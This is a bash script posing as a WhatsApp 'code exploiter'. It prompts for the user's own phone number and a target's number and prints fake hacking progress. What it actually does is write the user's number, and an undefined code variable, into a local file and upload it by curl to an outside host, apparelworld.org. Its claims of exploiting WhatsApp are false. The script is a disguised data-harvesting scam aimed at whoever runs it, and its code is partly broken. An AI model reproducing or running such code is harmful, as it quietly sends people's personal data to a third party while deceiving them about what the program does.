
#!/bin/bash
clear
echo "
<-- JELEK -->
####################
#   Whatsapp Code  # By ./Papiasu
#     Exploiter    # 
    asumamih@gmail.com
####################

Copyright (c) 2021 ./Papiasu Ganteng";
echo "";
read -p "Nomer Kamu (+62xxxx)=> " nomer;
read -p "Nomer Target (+62xxxx) => " target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 0.5;
echo "[+] Go.";
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 1
echo "[+] Success Exploited!";
exit;
